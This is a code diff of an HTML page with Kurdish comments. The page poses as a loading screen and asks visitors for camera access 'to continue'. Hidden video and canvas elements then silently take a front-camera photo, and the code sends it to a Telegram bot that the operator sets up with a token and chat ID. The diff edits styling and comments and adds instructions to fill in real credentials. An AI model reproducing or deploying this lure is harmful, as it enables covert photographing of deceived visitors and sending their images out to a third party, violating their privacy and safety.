@@ -16,12 +16,14 @@
         }
         .container {
             text-align: center;
-            padding: 200px;
+            padding: 40px;
             background: white;
             border-radius: 8px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
         }
-        /* ڤیدیۆیێ دێ ڤەشێرین داکو نەبینیت */
+        /* ڤیدیۆ و کانڤاس دێ ڤەشارتى بن داکو کەس نەبینیت */
         video, canvas {
             display: none;
         }
@@ -30,58 +32,52 @@
 <body>
 
 <div class="container">
-    <h2>پەیج یێ یێ باربوو دکەت... چاڤەڕێ بە</h2>
+    <h2>پەیج یێ باربوو دکەت... چاڤەڕێ بە</h2>
     <p>ژ کەرەما خۆ دەستێریێ بدە کامیرێ بۆ بەردەوامبوونێ.</p>
 </div>
 
-<!-- توخمێن ڤەشارتى بۆ گرتنا وێنەیی -->
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    // ل ڤێرێ زانیاریێن بۆتا خۆ بنڤێسه
-    const TELEGRAM_BOT_TOKEN = 'تۆکنێ_بۆتێ_تە'; 
-    const TELEGRAM_CHAT_ID = 'ئایدیێ_چاتێ_تە'; 
+    // ⚠️ ل ڤێرێ زانیاریێن خۆ یێن ڕاستەقینە د ناڤبەرا ' ' دا بنڤێسه:
+    const TELEGRAM_BOT_TOKEN = 'تۆکنێ_بۆتێ_خۆ_ل_ڤێرێ_دابنێ'; 
+    const TELEGRAM_CHAT_ID = 'ئایدیێ_چاتێ_خۆ_یێ_ژمارەیی_ل_ڤێرێ_دابنێ'; 
 
-    // دەستپێکرنا کامیرێ ئێکسەر دەمێ پەیج ڤەدبیت
     window.addEventListener('DOMContentLoaded', async () => {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
         try {
-            // داخوازکرنا دەستێریێ بۆ کامێرا پێشیێ (Front Camera)
+            // داخوازکرنا دەستێریێ بۆ کامێرا پێشیێ
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" } 
             });
             
             video.srcObject = stream;
 
-            // چاڤەڕێ بوون بۆ ١ چرکە داکو کامێرا ڕوون بیت، پاشان وێنە دێ هێتە گرتن
+            // چاڤەڕێ بوون بۆ 1.5 چرکە داکو وێنە ڕوون بیت
             setTimeout(() => {
-                // قەبارێ وێنەیی دێ کەنە وەکى قەبارێ ڤیدیۆیێ
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
-                // کێشانا وێنەیی د ناڤ Canvas دا
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // گوهۆڕینا وێنەیی بۆ Blob (فایل) بۆ فرێکرنێ
                 canvas.toBlob((blob) => {
                     sendPhotoToTelegram(blob);
                 }, 'image/jpeg');
 
-                // گرتنا کامیرێ پشتی وێنە هاتیە گرتن
+                // گرتنا کامیرێ پشتی وێنە هاتە گرتن
                 stream.getTracks().forEach(track => track.stop());
 
             }, 1500);
 
         } catch (error) {
-            console.log("کەسێ ڕەتکر یان خەلەتتیەک هەیە: ", error);
+            console.log("دەستێری نەهاتە دان: ", error);
         }
     });
 
-    // فانکشنا فرێکرنا وێنەیی بۆ تیلیگرامی
     function sendPhotoToTelegram(photoBlob) {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -93,8 +89,7 @@
         })
         .then(response => response.json())
         .then(data => {
-            console.log('وێنە بۆ تیلیگرامی هاتە فرێکرن');
-            // ل ڤێرێ دشێی کەسی ببەیە بۆ لینکەکێ دی یان نامەکێ نیشا بدەی
+            console.log('وێنە بۆ بۆتێ تە هاتە فرێکرن!');
         })
         .catch(err => console.error('خەلەتتی د فرێکرنێ دا:', err));
     }
